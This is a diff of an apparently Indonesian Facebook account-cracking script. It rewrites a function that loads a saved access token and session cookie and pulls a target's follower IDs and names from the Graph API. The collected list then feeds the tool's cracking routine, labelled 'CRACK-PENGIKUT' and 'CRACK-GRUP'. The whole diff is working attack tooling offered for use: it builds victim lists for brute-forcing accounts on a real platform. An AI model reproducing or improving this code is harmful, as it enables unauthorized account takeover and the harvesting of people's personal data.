@@ -724,27 +724,33 @@ def dump_massal():
 		time.sleep(3)
 		back()
 #-------------------[ CRACK-PENGIKUT ]----------------#
-def dump_pengikut():
+def pengikut():
 	try:
 		token = open('.token.txt','r').read()
 		cok = open('.cok.txt','r').read()
 	except IOError:
 		exit()
-	print('>> Ketik ( me ) Jika Ingin Crack Follower Sendiri ')
-	pil = input('>> Masukkan Idz Target : ')
+	ses = requests.Session()
+	cetak(panel(f"Ketik 'Me' Jika Ingin Crack Dari Total Followers Anda Sendiri",width=90,padding=(0,7),style=f"bold white"))
+	akun = console.input(f' ╰─  Masukan Id Target : ')
 	try:
-		koh2 = requests.get('https://graph.facebook.com/'+pil+'?fields=subscribers.limit(99999)&access_token='+tokenku[0],cookies={'cookie': cok}).json()
+		koh2 = ses.get(f'https://graph.facebook.com/{akun}?fields=subscribers.limit(5000)&access_token={token}',cookies={'cookie': cok}).json()
 		for pi in koh2['subscribers']['data']:
-			try:id.append(pi['id']+'|'+pi['name'])
+			try:
+			    id.append(pi['id']+'|'+pi['name'])
+			    sys.stdout.write(f"\r ╰─  Mengumpulkan {len(id)} Idz...");sys.stdout.flush()
+			    time.sleep(0.0002)
 			except:continue
-		print(f'>> Total Idz :{h} '+str(len(id)))
+		print("\r")
+		cetak(panel(f"Berhasil Mengumpulkan {len(id)} Idz",width=90,padding=(0,22),style=f"bold white"))
 		setting()
 	except requests.exceptions.ConnectionError:
-		print('>> Koneksi Internet Bermasalah ')
-		exit()
+		print(f" ╰─  Koneksi Internet Anda Bermasalah")
+		time.sleep(3);exit()
 	except (KeyError,IOError):
-		print('>> Gagal Mengambil Target ')
-		exit()
+		print(f" ╰─  Gagal Dump Id, Kemungkinan Akun Private")
+		time.sleep(3);exit()
+
 #------------------[ CRACK-GRUP ]-----------------#
 balmond = b+"["+h+"✓"+b+"]"
 
